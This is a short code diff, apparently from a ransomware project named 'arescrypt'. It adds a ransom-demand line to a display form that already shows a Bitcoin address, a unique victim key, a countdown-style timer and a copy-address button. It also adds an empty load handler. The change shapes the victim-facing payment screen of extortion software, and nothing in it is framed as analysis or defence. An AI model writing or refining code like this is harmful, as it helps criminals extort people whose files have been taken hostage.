@@ -26,6 +26,7 @@ namespace arescrypt
 
             this.cryptoAddress.Text = config.cryptoAddress;
             this.uniqueKeyDisplay.Text = userData.getUniqueKey();
+            this.amountChargeNotice.Text = "Send $" + Configuration.amountToCharge + " worth of Bitcoin to this address:";
         }        
         
         private void lostTimer_Tick(object sender, EventArgs e)
@@ -143,5 +144,10 @@ namespace arescrypt
 
         private void copyBtn_Click(object sender, EventArgs e)
         { cryptoAddress.Select(); Clipboard.SetText(cryptoAddress.Text); }
+
+        private void Display_Load(object sender, EventArgs e)
+        {
+
+        }
     }
 }
